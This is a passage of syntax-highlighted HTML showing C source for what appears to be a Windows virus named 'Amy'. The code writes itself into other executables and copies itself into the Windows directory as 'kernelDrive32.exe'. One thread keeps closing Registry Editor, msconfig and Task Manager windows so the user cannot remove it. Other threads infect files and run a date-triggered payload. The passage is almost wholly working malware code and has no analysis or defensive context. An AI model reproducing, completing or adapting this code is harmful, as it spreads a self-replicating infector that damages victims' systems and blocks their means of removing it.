</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Future</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc0">
                                </span><span class="sc11">Future</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">MyCode</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">MySize</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc10">&amp;</span><span class="sc11">writ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc10">}</span><span class="sc0">

                                </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">Me</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">Future</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">EcDec</span><span class="sc10">(</span><span class="sc11">FFile</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">Execute</span><span class="sc10">(</span><span class="sc11">FFile</span><span class="sc10">,</span><span class="sc11">Arg</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">                     
                             
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">Resident</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc11">param</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">   
</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hand</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">v1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Registry Editor"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">v2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"System Configuration Utility"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">v3</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Editor del Registro"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">v4</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Utilidad de configuracin del sistema"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">v5</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Windows Task Manager"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">v6</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Administrador de tareas de Windows"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">hand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">v1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                  </span><span class="sc11">PostMessage</span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">         
                 </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">hand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">v2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                  </span><span class="sc11">PostMessage</span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">         
                 </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">hand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">v3</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                  </span><span class="sc11">PostMessage</span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">         
                 </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">hand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">v4</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                  </span><span class="sc11">PostMessage</span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">         
                 </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">hand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">v5</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                  </span><span class="sc11">PostMessage</span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">         
                 </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">hand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">v6</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                  </span><span class="sc11">PostMessage</span><span class="sc10">(</span><span class="sc11">hand</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">         
                 </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">close</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">   
           
                

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Cre4teAllThr3adz</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">thread1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">Inf3ct</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">CREATE_SUSPENDED</span><span class="sc10">,&amp;</span><span class="sc11">ID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">thread2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">Im4g3z</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">CREATE_SUSPENDED</span><span class="sc10">,&amp;</span><span class="sc11">ID</span><span class="sc10">);</span><span class="sc0">      
</span><span class="sc11">thread3</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MzG</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">CREATE_SUSPENDED</span><span class="sc10">,&amp;</span><span class="sc11">ID</span><span class="sc10">);</span><span class="sc0">           
</span><span class="sc11">thread4</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SueltaAlHost</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">CREATE_SUSPENDED</span><span class="sc10">,&amp;</span><span class="sc11">ID</span><span class="sc10">);</span><span class="sc0">         
</span><span class="sc11">thread5</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">Resident</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">CREATE_SUSPENDED</span><span class="sc10">,&amp;</span><span class="sc11">ID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">WakeThread</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">thread1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">thread2</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">thread3</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">thread4</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">thread5</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hThisInstance</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpszArgument</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nFunsterStil</span><span class="sc10">)</span><span class="sc0">

</span><span class="sc10">{</span><span class="sc0">                   
                     </span><span class="sc11">Arg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lpszArgument</span><span class="sc10">;</span><span class="sc0">
                     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">AmYModulE</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
                     </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">AmYModulE</span><span class="sc10">,</span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">GetTempPath</span><span class="sc10">(</span><span class="sc4">260</span><span class="sc10">,</span><span class="sc11">tmpfol</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">GetCurrentDirectory</span><span class="sc10">(</span><span class="sc4">260</span><span class="sc10">,</span><span class="sc11">actual</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">windirx</span><span class="sc10">,</span><span class="sc4">260</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">AmyName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">windirx</span><span class="sc10">;</span><span class="sc0">
                     </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">AmyName</span><span class="sc10">,</span><span class="sc6">"\\kernelDrive32.exe"</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">AmYModulE</span><span class="sc10">,</span><span class="sc11">AmyName</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">Cre4teAllThr3adz</span><span class="sc10">();</span><span class="sc0">
                     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Paydate</span><span class="sc10">()==</span><span class="sc4">1</span><span class="sc10">){</span><span class="sc0">
                                     </span><span class="sc11">WakeThread</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
                                     </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">thread2</span><span class="sc10">,</span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
                                     </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">thread2</span><span class="sc10">);</span><span class="sc0"> 
                                     </span><span class="sc11">WakeThread</span><span class="sc10">(</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
                                     </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">thread3</span><span class="sc10">,</span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
                                     </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">thread3</span><span class="sc10">);</span><span class="sc0">
                                     </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                                     </span><span class="sc10">}</span><span class="sc0">
                     </span><span class="sc11">WakeThread</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">thread4</span><span class="sc10">,</span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">thread4</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hMutex</span><span class="sc10">=</span><span class="sc11">CreateMutex</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc6">"Amy"</span><span class="sc10">);</span><span class="sc0"> 
                     </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetLastError</span><span class="sc10">()==</span><span class="sc11">ERROR_ALREADY_EXISTS</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> 
                     </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                     </span><span class="sc11">GetMyCode</span><span class="sc10">();</span><span class="sc0">        
                     </span><span class="sc11">WakeThread</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">WakeThread</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">0xffffffff</span><span class="sc10">);</span><span class="sc0">
                     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc10">}</span><span class="sc0">




</span></div></body>
</html>
